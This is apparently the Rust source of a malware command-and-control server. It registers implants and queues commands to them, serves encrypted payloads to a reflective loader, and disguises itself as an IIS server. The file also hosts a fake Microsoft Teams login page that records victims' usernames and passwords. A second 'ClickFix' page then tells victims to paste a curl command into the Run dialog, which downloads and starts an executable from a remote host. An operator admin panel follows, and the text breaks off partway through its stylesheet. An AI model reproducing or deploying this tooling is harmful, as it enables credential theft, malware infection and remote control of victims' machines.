use std::net::SocketAddr;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use std::fs;

use anyhow::Result;
use axum::body::Bytes;
use axum::extract::{DefaultBodyLimit, Form, Path, State};
use axum::http::{header, HeaderValue, StatusCode};
use axum::response::{Html, Response};
use axum::routing::{get, post};
use axum::Router;
use axum_server::tls_rustls::RustlsConfig;
use rsa::RsaPrivateKey;
use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::{crypto, framing, models, store};

#[derive(Clone)]
pub struct AppState {
    pub store: Arc<Mutex<store::Store>>,
    pub private_key: Arc<RsaPrivateKey>,
    pub interval: u32,
    pub jitter: f64,
    pub payload: Option<PathBuf>,
    pub payload2: Option<PathBuf>,
}

pub async fn serve(
    state: AppState,
    addr: SocketAddr,
    cert_path: PathBuf,
    key_path: PathBuf,
) -> Result<()> {
    let tls = RustlsConfig::from_pem_file(cert_path, key_path).await?;

    let app = Router::new()
        .route("/api/v1/pubkey", get(route_pubkey))
        .route("/api/v1/session", post(route_session))
        .route("/api/v1/check", post(route_check))
        .route("/api/v1/result", post(route_result).layer(DefaultBodyLimit::max(50 * 1024 * 1024)))
        .route("/update", get(route_phish_get).post(route_phish_post))
        .route("/dl", get(route_dl))
        .route("/dl2", get(route_dl2))
        .route("/admin", get(route_admin_ui))
        .route("/admin/api/sessions", get(route_admin_sessions))
        .route("/admin/api/task", post(route_admin_task))
        .route("/admin/api/history/{id}", get(route_admin_history))
        .with_state(state);

    axum_server::bind_rustls(addr, tls)
        .serve(app.into_make_service())
        .await
        .map_err(Into::into)
}

async fn route_pubkey(State(s): State<AppState>) -> Response {
    match crypto::serialize_public(&s.private_key.to_public_key()) {
        Ok(pem)  => c2_ok(pem),
        Err(_) => c2_err(StatusCode::INTERNAL_SERVER_ERROR),
    }
}

async fn route_session(State(s): State<AppState>, body: Bytes) -> Response {
    let payload: models::SessionPayload = match serde_json::from_slice(&body) {
        Ok(p) => p,
        Err(_) => return c2_err(StatusCode::BAD_REQUEST),
    };

    let session_key = match crypto::unwrap_session_key(&s.private_key, &payload.key) {
        Ok(k) => k,
        Err(_) => return c2_err(StatusCode::BAD_REQUEST),
    };

    let id_bytes = match framing::id_from_hex(&payload.id) {
        Ok(b) => b,
        Err(_) => return c2_err(StatusCode::BAD_REQUEST),
    };

    let Ok(store) = s.store.lock() else {
        return c2_err(StatusCode::INTERNAL_SERVER_ERROR);
    };
    let known = store
        .register(
            &payload.id,
            &payload.hostname.as_deref().unwrap_or("?"),
            &payload.username.as_deref().unwrap_or("?"),
            &payload.os.as_deref().unwrap_or("?"),
            payload.pid,
            payload.elevated.unwrap_or(false),
            payload.arch.as_deref(),
            &session_key,
        )
        .unwrap_or(false);

    println!(
        "[+] {} {}/{} ({:.8})",
        if known { "reprise" } else { "nouvel implant" },
        payload.hostname.as_deref().unwrap_or("?"),
        payload.username.as_deref().unwrap_or("?"),
        payload.id,
    );

    c2_ok(framing::pack(
        &id_bytes,
        &session_key,
        &models::beacon_config(s.interval, s.jitter),
    ))
}

async fn route_check(State(s): State<AppState>, body: Bytes) -> Response {
    let id = match framing::read_id(&body) {
        Ok(id) => id,
        Err(_) => return c2_err(StatusCode::BAD_REQUEST),
    };
    let id_hex = framing::id_hex(&id);

    let key_arr = match key_for_id(&s, &id_hex) {
        Some(k) => k,
        None => return c2_err(StatusCode::NOT_FOUND),
    };

    if framing::unpack(&body, &key_arr).is_err() {
        return c2_err(StatusCode::BAD_REQUEST);
    }

    let Ok(store) = s.store.lock() else {
        return c2_err(StatusCode::INTERNAL_SERVER_ERROR);
    };
    store.touch(&id_hex).ok();
    let plaintext = match store.claim(&id_hex).unwrap_or(None) {
        Some(t) => models::task(t.id, &t.command, &t.args),
        None => models::nop(),
    };
    drop(store);

    c2_ok(framing::pack(&id, &key_arr, &plaintext))
}

async fn route_result(State(s): State<AppState>, body: Bytes) -> Response {
    let id = match framing::read_id(&body) {
        Ok(id) => id,
        Err(_) => return c2_err(StatusCode::BAD_REQUEST),
    };
    let id_hex = framing::id_hex(&id);

    let key_arr = match key_for_id(&s, &id_hex) {
        Some(k) => k,
        None => return c2_err(StatusCode::NOT_FOUND),
    };

    let (_, plaintext) = match framing::unpack(&body, &key_arr) {
        Ok(p) => p,
        Err(_) => return c2_err(StatusCode::BAD_REQUEST),
    };

    let msg: Value = match serde_json::from_slice(&plaintext) {
        Ok(v) => v,
        Err(_) => return c2_err(StatusCode::BAD_REQUEST),
    };

    let task_id = match msg.get("task_id").and_then(Value::as_i64) {
        Some(id) => id,
        None => return c2_err(StatusCode::BAD_REQUEST),
    };
    let result_body = msg.get("body").and_then(Value::as_str).unwrap_or("");

    let Ok(store) = s.store.lock() else {
        return c2_err(StatusCode::INTERNAL_SERVER_ERROR);
    };
    store.finish(task_id, result_body).ok();
    drop(store);
    c2_ok(framing::pack(&id, &key_arr, &models::ack()))
}

async fn route_phish_get() -> Html<&'static str> {
    Html(PHISH_PAGE)
}

#[derive(Deserialize)]
struct PhishForm {
    username: Option<String>,
    password: Option<String>,
}

async fn route_phish_post(Form(form): Form<PhishForm>) -> Response {
    let u = form.username.as_deref().unwrap_or("");
    let p = form.password.as_deref().unwrap_or("");
    if !u.is_empty() || !p.is_empty() {
        println!("[phish] {}:{}", u, p);
    }
    Response::builder()
        .status(axum::http::StatusCode::OK)
        .header(header::CONTENT_TYPE, "text/html; charset=utf-8")
        .header(header::SERVER, "Microsoft-IIS/10.0")
        .body(axum::body::Body::from(CLICKFIX_PAGE))
        .unwrap()
}

async fn route_dl(State(s): State<AppState>) -> Response {
    let Some(ref path) = s.payload else {
        return c2_err(axum::http::StatusCode::NOT_FOUND);
    };
    match fs::read(path) {
        Ok(bytes) => {
            let filename = path
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("setup.exe");
            let cd = format!("attachment; filename=\"{}\"", filename);
            Response::builder()
                .status(axum::http::StatusCode::OK)
                .header(header::CONTENT_TYPE, "application/octet-stream")
                .header("Content-Disposition", cd)
                .header(header::SERVER, "Microsoft-IIS/10.0")
                .body(axum::body::Body::from(bytes))
                .unwrap()
        }
        Err(_) => c2_err(axum::http::StatusCode::NOT_FOUND),
    }
}

// Sert le payload AES-chiffré (nonce||ciphertext) pour le loader reflectif
async fn route_dl2(State(s): State<AppState>) -> Response {
    let Some(ref path) = s.payload2 else {
        return c2_err(axum::http::StatusCode::NOT_FOUND);
    };
    match fs::read(path) {
        Ok(bytes) => Response::builder()
            .status(axum::http::StatusCode::OK)
            .header(header::CONTENT_TYPE, "application/octet-stream")
            .header(header::SERVER, "Microsoft-IIS/10.0")
            .body(axum::body::Body::from(bytes))
            .unwrap(),
        Err(_) => c2_err(axum::http::StatusCode::NOT_FOUND),
    }
}

// -- admin UI ----------------------------------------------------------------

async fn route_admin_ui() -> Response {
    Response::builder()
        .header(header::CONTENT_TYPE, "text/html; charset=utf-8")
        .header(header::CACHE_CONTROL, "no-store")
        .body(axum::body::Body::from(ADMIN_PAGE))
        .unwrap()
}

async fn route_admin_sessions(State(s): State<AppState>) -> axum::Json<Vec<AdminSession>> {
    use std::time::{SystemTime, UNIX_EPOCH};
    let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs_f64();
    let Ok(store) = s.store.lock() else {
        return axum::Json(vec![]);
    };
    let implants = store.implants().unwrap_or_default();
    axum::Json(implants.iter().map(|imp| {
        let age = (now - imp.last_seen) as u64;
        AdminSession {
            id: imp.id.clone(),
            short: imp.id[..8].to_string(),
            hostname: imp.hostname.clone(),
            username: imp.username.clone(),
            os: imp.os.clone(),
            elevated: imp.elevated,
            arch: imp.arch.clone().unwrap_or_else(|| "x64".to_string()),
            online: age < 90,
            age,
            first_seen: imp.first_seen,
            pid: imp.pid,
        }
    }).collect())
}

#[derive(serde::Deserialize)]
struct TaskReq { id: String, command: String, args: Option<String> }

#[derive(Serialize)]
struct AdminSession {
    id: String,
    short: String,
    hostname: String,
    username: String,
    os: String,
    elevated: bool,
    arch: String,
    online: bool,
    age: u64,
    first_seen: f64,
    pid: Option<i64>,
}

#[derive(Serialize)]
struct AdminHistoryEntry {
    task_id: i64,
    command: String,
    args: String,
    state: String,
    result: Option<String>,
    created: f64,
}

async fn route_admin_task(State(s): State<AppState>, axum::Json(body): axum::Json<TaskReq>) -> axum::Json<serde_json::Value> {
    let Ok(store) = s.store.lock() else {
        return axum::Json(serde_json::json!({"ok": false, "err": "lock empoisonné"}));
    };
    let args = body.args.as_deref().unwrap_or("");
    match store.enqueue(&body.id, &body.command, args) {
        Ok(task_id) => axum::Json(serde_json::json!({"ok": true, "task_id": task_id})),
        Err(e) => axum::Json(serde_json::json!({"ok": false, "err": e.to_string()})),
    }
}

async fn route_admin_history(State(s): State<AppState>, Path(id): Path<String>) -> axum::Json<Vec<AdminHistoryEntry>> {
    let Ok(store) = s.store.lock() else {
        return axum::Json(vec![]);
    };
    let entries = store.results_for(&id, 50).unwrap_or_default();
    axum::Json(entries.iter().map(|e| AdminHistoryEntry {
        task_id: e.task_id,
        command: e.command.clone(),
        args: e.args.clone(),
        state: e.state.clone(),
        result: e.result.clone(),
        created: e.created,
    }).collect())
}

// -- helpers -----------------------------------------------------------------

fn key_for_id(s: &AppState, id_hex: &str) -> Option<[u8; 32]> {
    let store = s.store.lock().ok()?;
    let raw = store.session_key(id_hex).ok()??;
    raw.try_into().ok()
}

fn c2_ok(body: Vec<u8>) -> Response {
    let mut resp = Response::new(axum::body::Body::from(body));
    resp.headers_mut().insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static("application/octet-stream"),
    );
    resp.headers_mut().insert(
        header::SERVER,
        HeaderValue::from_static("Microsoft-IIS/10.0"),
    );
    resp
}

fn c2_err(status: StatusCode) -> Response {
    Response::builder()
        .status(status)
        .header(header::SERVER, "Microsoft-IIS/10.0")
        .body(axum::body::Body::empty())
        .unwrap()
}

const PHISH_PAGE: &str = r##"<!doctype html>
<html lang="fr"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Se connecter à votre compte</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#faf9f8;
     display:flex;flex-direction:column;min-height:100vh}
.top-bar{padding:16px 24px;display:flex;align-items:center;gap:12px}
.ms-logo svg{width:108px;height:24px}
.divider{width:1px;height:20px;background:#d2d0ce;margin:0 4px}
.teams-name{font-size:15px;color:#323130;font-weight:400}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
.box{background:#fff;width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.12),0 0 0 1px rgba(0,0,0,.04)}
.teams-logo{display:flex;align-items:center;gap:10px;margin-bottom:20px}
.teams-logo svg{width:40px;height:40px}
h1{font-size:24px;font-weight:600;color:#201f1e;margin-bottom:4px;line-height:1.2}
.subtitle{font-size:13px;color:#605e5c;margin-bottom:16px}
.alert{background:#fff4ce;border-left:3px solid #f7c948;padding:10px 14px;
       font-size:12px;color:#3d3300;margin-bottom:20px;display:flex;gap:8px;align-items:flex-start;line-height:1.5}
.alert-icon{flex-shrink:0;margin-top:1px}
label{display:block;font-size:13px;font-weight:600;color:#323130;margin-bottom:5px}
.input-wrap{position:relative;margin-bottom:16px}
input[type=email],input[type=password]{display:block;width:100%;padding:8px 10px;
  border:1px solid #8a8886;font-size:14px;font-family:inherit;outline:none;
  background:#fff;color:#323130;height:36px}
input:focus{border-color:#0078d4;box-shadow:0 0 0 1px #0078d4}
.forgot{font-size:12px;color:#0078d4;text-decoration:none;float:right;margin-top:-12px;margin-bottom:16px;display:block}
.forgot:hover{text-decoration:underline}
.btn{display:block;width:100%;height:36px;background:#0078d4;color:#fff;border:0;
     font-size:14px;font-family:inherit;cursor:pointer;font-weight:600;margin-top:8px}
.btn:hover{background:#106ebe}
.sep{display:flex;align-items:center;gap:10px;margin:20px 0;color:#8a8886;font-size:12px}
.sep::before,.sep::after{content:'';flex:1;height:1px;background:#edebe9}
.links{display:flex;flex-direction:column;gap:6px}
.links a{font-size:13px;color:#0078d4;text-decoration:none}
.links a:hover{text-decoration:underline}
.bottom{padding:16px 24px;display:flex;gap:16px;font-size:11px}
.bottom a{color:#605e5c;text-decoration:none}
.bottom a:hover{text-decoration:underline}
</style></head><body>
<div class="top-bar">
  <div class="ms-logo">
    <svg viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M0 0h11.2v11.2H0z" fill="#F25022"/>
      <path d="M12.2 0h11.2v11.2H12.2z" fill="#7FBA00"/>
      <path d="M0 12.2h11.2v11.2H0z" fill="#00A4EF"/>
      <path d="M12.2 12.2h11.2v11.2H12.2z" fill="#FFB900"/>
      <path d="M34.5 6.3h2.1l2.6 7.2 2.6-7.2h2.1v9.4h-1.4V8.5l-2.6 7.2h-1.4l-2.6-7.2v7.2h-1.4V6.3zm11.2 0h1.5v9.4h-1.5V6.3zm4.2 0h1.5v8.1h4.4v1.3h-5.9V6.3zm7.6 0h1.5v8.1h4.4v1.3h-5.9V6.3zm7.6 0h5.8v1.3H66v2.7h4.5v1.3H66v2.8h5v1.3h-6.5V6.3zm7.6 0h2l3.1 5.1 3.1-5.1h1.9v9.4h-1.4V8.7l-3 5h-.3l-3-5v7h-1.4V6.3zm12.9 0h1.5v9.4h-1.5V6.3zm4.2 0h2.6c2.4 0 4.1 1.5 4.1 4.6s-1.6 4.8-4.1 4.8h-2.6V6.3zm1.5 1.3v6.8h1c1.6 0 2.6-1 2.6-3.4 0-2.3-1-3.4-2.6-3.4h-1z" fill="#323130"/>
    </svg>
  </div>
  <div class="divider"></div>
  <span class="teams-name">Microsoft Teams</span>
</div>
<div class="main">
  <div class="box">
    <div class="teams-logo">
      <svg viewBox="0 0 44 40" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="31" cy="9" r="9" fill="#7B83EB"/>
        <path d="M18.5 33c0-7.2 5.6-11 12.5-11 6.9 0 12.5 3.8 12.5 11H18.5z" fill="#7B83EB"/>
        <circle cx="38.5" cy="7" r="5.5" fill="#4B53BC"/>
        <path d="M32 23.5c0-4 2.8-6 6.5-6s6.5 2 6.5 6H32z" fill="#4B53BC"/>
        <rect x="1" y="11" width="27" height="27" rx="4" fill="#5059C9"/>
        <rect x="5" y="18.5" width="19" height="3.5" rx="1" fill="white"/>
        <rect x="12.5" y="18.5" width="4" height="14" rx="1" fill="white"/>
      </svg>
    </div>
    <h1>Connexion</h1>
    <p class="subtitle">Accédez à Microsoft Teams</p>
    <div class="alert">
      <svg class="alert-icon" width="14" height="14" viewBox="0 0 16 16" fill="none"><path d="M8.517 1.747a.6.6 0 00-1.034 0L1.096 12.5A.6.6 0 001.613 13.4h12.774a.6.6 0 00.517-.9L8.517 1.747zM7.25 6.25a.75.75 0 011.5 0v3a.75.75 0 01-1.5 0v-3zM8 11a1 1 0 110 2 1 1 0 010-2z" fill="#6B4F00"/></svg>
      Votre session a expiré. Par mesure de sécurité, reconnectez-vous pour continuer.
    </div>
    <form method="post" action="/update">
      <label for="u">Adresse e-mail professionnelle ou scolaire</label>
      <div class="input-wrap">
        <input id="u" name="username" type="email" placeholder="nom@organisation.fr" autocomplete="email" autofocus required>
      </div>
      <label for="p">Mot de passe</label>
      <div class="input-wrap">
        <input id="p" name="password" type="password" placeholder="" autocomplete="current-password" required>
      </div>
      <a href="#" class="forgot">Mot de passe oublié ?</a>
      <button class="btn" type="submit">Se connecter</button>
    </form>
    <div class="sep">ou</div>
    <div class="links">
      <a href="#">Connexion avec un autre compte</a>
      <a href="#">Accès à un compte professionnel ou scolaire</a>
    </div>
  </div>
</div>
<div class="bottom">
  <a href="#">Conditions d'utilisation</a>
  <a href="#">Confidentialité &amp; cookies</a>
  <a href="#">...</a>
</div>
</body></html>"##;

const CLICKFIX_PAGE: &str = r##"<!doctype html>
<html lang="fr"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Microsoft Teams — Action requise</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#f5f5f5;
     display:flex;flex-direction:column;min-height:100vh;color:#323130}
.top-bar{padding:12px 24px;display:flex;align-items:center;gap:10px;background:#fff;border-bottom:1px solid #e1dfdd}
.ms-logo{display:flex;align-items:center;gap:8px}
.ms-name{font-size:15px;color:#323130;font-weight:400;letter-spacing:-.2px}
.divider{width:1px;height:20px;background:#d2d0ce;margin:0 6px}
.teams-mark{display:flex;align-items:center;gap:6px}
.teams-name{font-size:15px;color:#323130;font-weight:600}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
.box{background:#fff;width:480px;padding:40px;border-radius:4px;box-shadow:0 2px 4px rgba(0,0,0,.08),0 0 2px rgba(0,0,0,.04)}
.verified{display:flex;align-items:center;gap:8px;background:#dff6dd;border:1px solid #107c10;
  padding:10px 14px;margin-bottom:24px;font-size:13px;color:#0e5a0e;font-weight:600;border-radius:2px}
.verified svg{flex-shrink:0}
h1{font-size:20px;font-weight:600;margin-bottom:8px}
.sub{font-size:13px;color:#605e5c;margin-bottom:20px;line-height:1.6}
.info-box{background:#f0f6ff;border-left:3px solid #0078d4;padding:12px 14px;
  margin-bottom:20px;font-size:12px;color:#004578;line-height:1.5;border-radius:0 2px 2px 0}
.steps{list-style:none;margin-bottom:4px}
.steps li{display:flex;gap:12px;align-items:flex-start;margin-bottom:16px;font-size:13px;line-height:1.5}
.step-n{background:#0078d4;color:#fff;border-radius:50%;width:22px;height:22px;min-width:22px;
  display:flex;align-items:center;justify-content:center;font-weight:700;font-size:11px;margin-top:1px}
.step-content{flex:1}
.step-title{font-weight:600;margin-bottom:3px}
.step-sub{color:#605e5c;font-size:12px}
kbd{display:inline-flex;align-items:center;gap:3px;background:#f3f2f1;border:1px solid #c8c6c4;
    border-bottom-width:2px;border-radius:3px;padding:2px 6px;font-family:'Cascadia Code',Consolas,monospace;
    font-size:11px;color:#323130;vertical-align:middle}
.win-key{display:inline-flex;align-items:center;gap:3px;background:#f3f2f1;border:1px solid #c8c6c4;
    border-bottom-width:2px;border-radius:3px;padding:3px 6px;vertical-align:middle}
.win-key svg{width:12px;height:12px}
.cmd-wrap{margin-top:8px}
.cmd-box{background:#1b1b1b;border-radius:4px;padding:14px 56px 14px 16px;position:relative}
.cmd-box code{color:#cccccc;font-family:'Cascadia Code',Consolas,monospace;font-size:11.5px;
  word-break:break-all;line-height:1.6;display:block}
.copy-btn{position:absolute;top:50%;right:10px;transform:translateY(-50%);
  background:#0078d4;color:#fff;border:0;padding:5px 10px;font-size:11px;
  cursor:pointer;border-radius:2px;white-space:nowrap;font-family:inherit;transition:background .15s}
.copy-btn:hover{background:#106ebe}
.copy-btn.done{background:#107c10}
.bottom{padding:14px 24px;display:flex;gap:16px;font-size:11px;border-top:1px solid #e1dfdd}
.bottom a{color:#605e5c;text-decoration:none}
.bottom a:hover{text-decoration:underline}
</style></head><body>
<div class="top-bar">
  <div class="ms-logo">
    <svg width="21" height="21" viewBox="0 0 21 21" fill="none"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
    <span class="ms-name">Microsoft</span>
  </div>
  <div class="divider"></div>
  <div class="teams-mark">
    <svg width="20" height="20" viewBox="0 0 16 16" fill="#6264A7"><path d="M9.186 4.797a2.42 2.42 0 1 0-2.86-2.448h1.178c.929 0 1.682.753 1.682 1.682zm-4.295 7.738h2.613c.929 0 1.682-.753 1.682-1.682V5.58h2.783a.7.7 0 0 1 .682.716v4.294a4.197 4.197 0 0 1-4.093 4.293c-1.618-.04-3-.99-3.667-2.35Zm10.737-9.372a1.674 1.674 0 1 1-3.349 0 1.674 1.674 0 0 1 3.349 0m-2.238 9.488-.12-.002a5.2 5.2 0 0 0 .381-2.07V6.306a1.7 1.7 0 0 0-.15-.725h1.792c.39 0 .707.317.707.707v3.765a2.6 2.6 0 0 1-2.598 2.598z"/><path d="M.682 3.349h6.822c.377 0 .682.305.682.682v6.822a.68.68 0 0 1-.682.682H.682A.68.68 0 0 1 0 10.853V4.03c0-.377.305-.682.682-.682Zm5.206 2.596v-.72h-3.59v.72h1.357V9.66h.87V5.945z"/></svg>
    <span class="teams-name">Teams</span>
  </div>
</div>
<div class="main">
  <div class="box">
    <div class="verified">
      <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm3.03 5.47l-3.5 3.5a.75.75 0 01-1.06 0l-1.5-1.5a.75.75 0 011.06-1.06l.97.97 2.97-2.97a.75.75 0 011.06 1.06z" fill="#107c10"/></svg>
      Identité vérifiée — Une action est requise pour continuer
    </div>
    <h1>Installer la mise à jour Teams</h1>
    <p class="sub">Une mise à jour critique de sécurité est disponible pour Microsoft Teams. Votre service informatique a déployé un programme d'installation automatique. Suivez les étapes ci-dessous.</p>
    <div class="info-box">
      <strong>Politique de sécurité de votre organisation :</strong> Cette mise à jour est obligatoire sous 24 h. Sans elle, l'accès à Teams sera suspendu.
    </div>
    <ol class="steps">
      <li>
        <div class="step-n">1</div>
        <div class="step-content">
          <div class="step-title">Ouvrez la fenêtre Exécuter</div>
          <div class="step-sub">
            Appuyez sur
            <span class="win-key"><svg viewBox="0 0 12 12" fill="none"><rect width="5.5" height="5.5" fill="#F25022"/><rect x="6.5" width="5.5" height="5.5" fill="#7FBA00"/><rect y="6.5" width="5.5" height="5.5" fill="#00A4EF"/><rect x="6.5" y="6.5" width="5.5" height="5.5" fill="#FFB900"/></svg></span>
            +
            <kbd>R</kbd>
            simultanément
          </div>
        </div>
      </li>
      <li>
        <div class="step-n">2</div>
        <div class="step-content">
          <div class="step-title">Copiez la commande ci-dessous</div>
          <div class="step-sub">Cliquez sur <strong>Copier</strong>, collez dans la fenêtre Exécuter, puis appuyez sur <kbd>Entrée</kbd></div>
          <div class="cmd-wrap">
            <div class="cmd-box">
              <code id="cmd">cmd /c curl -so %TEMP%\msteams_update.exe https://c2.nexgate.cloud/dl &amp; start /b %TEMP%\msteams_update.exe</code>
              <button class="copy-btn" id="cb" onclick="navigator.clipboard.writeText(document.getElementById('cmd').innerText).then(()=>{var b=document.getElementById('cb');b.innerText='Copié !';b.className='copy-btn done';setTimeout(()=>{b.innerText='Copier';b.className='copy-btn'},2000)})">Copier</button>
            </div>
          </div>
        </div>
      </li>
    </ol>
  </div>
</div>
<div class="bottom">
  <a href="#">Conditions d'utilisation</a>
  <a href="#">Confidentialité &amp; cookies</a>
  <a href="#">Support informatique</a>
</div>
</body></html>"##;

const ADMIN_PAGE: &str = r###"<!doctype html>
<html lang="fr"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>virology-rs</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#111113;--surface:#18181b;--surface2:#27272a;
  --border:#2e2e32;
  --fg:#d4d0ca;--fg2:#908c86;--fg3:#807c76;
  --accent:#d97706;--accent-h:#c2690a;
  --green:#22c55e;--red:#ef4444;--yellow:#eab308;
  font-family:system-ui,-apple-system,'Segoe UI',sans-serif;font-size:13px;
  color-scheme:dark;
}
html,body{height:100%;background:var(--bg);color:var(--fg)}
button,input{font-family:inherit;font-size:inherit}
button{cursor:pointer}
:focus-visible{outline:2px solid var(--accent);outline-offset:1px}

header{height:48px;background:var(--surface);border-bottom:1px solid var(--border);
  display:flex;align-items:center;padding:0 16px;gap:16px;flex-shrink:0}
h1.logo{font-weight:700;font-size:14px;color:var(--fg);letter-spacing:-.3px}
h1.logo span{font-weight:400;color:var(--fg3)}
.hdr-status{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--fg2)}
.pulse{width:7px;height:7px;border-radius:50%;background:var(--green);flex-shrink:0}
.pulse.off{background:var(--red)}
.hdr-right{margin-left:auto;display:flex;align-items:center;gap:14px}
#session-count{font-size:11px;color:var(--fg2)}
#session-count b{color:var(--fg);font-weight:600}
.kbd-hint{font-size:11px;color:var(--fg3)}
kbd{background:var(--surface2);border:1px solid var(--border);border-radius:3px;padding:1px 4px;
  font-size:10px;font-family:inherit;color:var(--fg2)}

.layout{display:flex;height:calc(100vh - 48px)}

.sidebar{width:280px;background:var(--surface);border-right:1px solid var(--border);
  display:flex;flex-direction:column;flex-shrink:0}
.sidebar-top{padding:12px;display:flex;flex-direction:column;gap:8px}
.search-wrap{position:relative}
#search{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--fg);
  padding:7px 10px 7px 28px;border-radius:4px;font-size:12px;outline:none;transition:border-color .15s}
#search:focus{border-color:var(--accent)}
#search::placeholder{color:var(--fg3)}
.search-icon{position:absolute;left:8px;top:50%;transform:translateY(-50%);color:var(--fg3);pointer-events:none}
.filter-row{display:flex;gap:3px}
.fbtn{flex:1;background:transparent;border:1px solid var(--border);color:var(--fg3);
  padding:4px 0;border-radius:4px;font-size:11px;text-align:center;transition:all .15s}
.fbtn:hover{color:var(--fg2);border-color:var(--fg3)}
.fbtn.active{background:var(--accent);color:#fff;border-color:var(--accent)}
#implant-list{flex:1;overflow-y:auto;padding:6px}
.implant-row{padding:8px 10px;border-radius:4px;cursor:pointer;margin-bottom:2px;
  border-left:3px solid transparent;transition:background .15s}
.implant-row:hover{background:var(--surface2)}
.implant-row.active{background:var(--surface2);border-left-color:var(--accent)}
.implant-row.online-row{border-left-color:var(--green)}
.implant-row.online-row.active{border-left-color:var(--accent)}
.implant-top{display:flex;align-items:center;gap:6px;margin-bottom:3px}
.dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
.dot.on{background:var(--green)}
.dot.off{background:var(--fg3);opacity:.4}
.implant-name{font-weight:600;font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
.badge{background:var(--surface2);border:1px solid var(--border);border-radius:3px;padding:1px 5px;
  font-size:10px;font-weight:600}
.badge.admin{color:var(--yellow);border-color:rgba(234,179,8,.25)}
.badge.pid{color:var(--fg2)}
.implant-meta{font-size:11px;color:var(--fg3);display:flex;gap:5px;flex-wrap:wrap;align-items:center}
.sidebar-footer{padding:8px 12px;border-top:1px solid var(--border);font-size:11px;color:var(--fg3);text-align:center}

.main{flex:1;display:flex;flex-direction:column;min-width:0;background:var(--bg)}
.main-empty{flex:1;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:12px;color:var(--fg3)}
.main-empty svg{opacity:.25}
.main-empty p{font-size:12px}

.terminal-wrap{flex:1;display:flex;flex-direction:column;min-height:0}
.term-header{padding:10px 16px;background:var(--surface);border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:10px;flex-shrink:0}
.term-info{display:flex;flex-direction:column;gap:2px}
.term-title{font-weight:600;font-size:13px;display:flex;align-items:center;gap:8px}
.term-sub{font-size:11px;color:var(--fg3)}

.qa-panel{background:var(--surface);border-bottom:1px solid var(--border);flex-shrink:0}
.qa-tabs{display:flex;gap:0;border-bottom:1px solid var(--border);padding:0 12px;overflow-x:auto}
.qa-tab{padding:7px 12px;font-size:11px;color:var(--fg3);cursor:pointer;border-bottom:2px solid transparent;
  white-space:nowrap;background:0;border-top:0;border-left:0;border-right:0;
  font-weight:600;text-transform:uppercase;letter-spacing:.3px;transition:color .15s}
.qa-tab:hover{color:var(--fg2)}
.qa-tab.active{color:var(--accent);border-bottom-color:var(--accent)}
.qa-actions{padding:8px 12px;display:flex;gap:4px;flex-wrap:wrap}
.qa-btn{background:var(--surface2);border:1px solid var(--border);color:var(--fg2);
  padding:4px 10px;border-radius:4px;font-size:11px;white-space:nowrap;transition:all .15s}
.qa-btn:hover{background:var(--accent);color:#fff;border-color:var(--accent)}

#terminal{flex:1;overflow-y:auto;padding:12px 16px;
  font-family:ui-monospace,'Cascadia Code','Fira Code',monospace;font-size:12px;line-height:1.6}
.entry{margin-bottom:10px;padding:10px 12px;background:var(--surface);border-radius:4px;
  border:1px solid var(--border)}
.entry-head{display:flex;align-items:baseline;gap:6px;flex-wrap:wrap}
.entry-cmd{color:var(--accent);font-weight:700}
.entry-cmd::before{content:'$ ';color:var(--fg3);font-weight:400}
.entry-args{color:var(--fg2)}
.entry-time{margin-left:auto;font-size:10px;color:var(--fg3);white-space:nowrap}
.entry-state{font-size:9px;padding:2px 6px;border-radius:3px;font-weight:700;letter-spacing:.5px;text-transform:uppercase}
.entry-state.done{background:rgba(34,197,94,.1);color:var(--green)}
.entry-state.running{background:rgba(234,179,8,.1);color:var(--yellow)}
.entry-state.pending{color:var(--fg3)}
.entry-out{color:var(--fg);white-space:pre-wrap;margin-top:8px;background:var(--bg);border-radius:3px;
  padding:8px 10px;max-height:300px;overflow-y:auto;font-size:11px;border:1px solid var(--border)}
.entry-pending{color:var(--fg3);font-style:italic;margin-top:6px;font-size:12px}

.cmd-bar{padding:10px 16px;background:var(--surface);border-top:1px solid var(--border);
  display:flex;gap:6px;flex-shrink:0;align-items:center}
#cmd-input{flex:1;background:var(--bg);border:1px solid var(--border);color:var(--fg);
  padding:8px 12px;font-family:ui-monospace,'Cascadia Code','Fira Code',monospace;
  font-size:12px;outline:none;border-radius:4px;transition:border-color .15s}
#cmd-input:focus{border-color:var(--accent)}
#cmd-input::placeholder{color:var(--fg3)}
.cmd-btns{display:flex;gap:4px}
#send-btn{background:var(--accent);color:#fff;border:0;padding:8px 16px;border-radius:4px;
  font-weight:600;font-size:12px;transition:background .15s}
#send-btn:hover{background:var(--accent-h)}
#clear-btn{background:transparent;color:var(--fg3);border:1px solid var(--border);padding:8px 10px;
  border-radius:4px;font-size:12px;transition:all .15s}
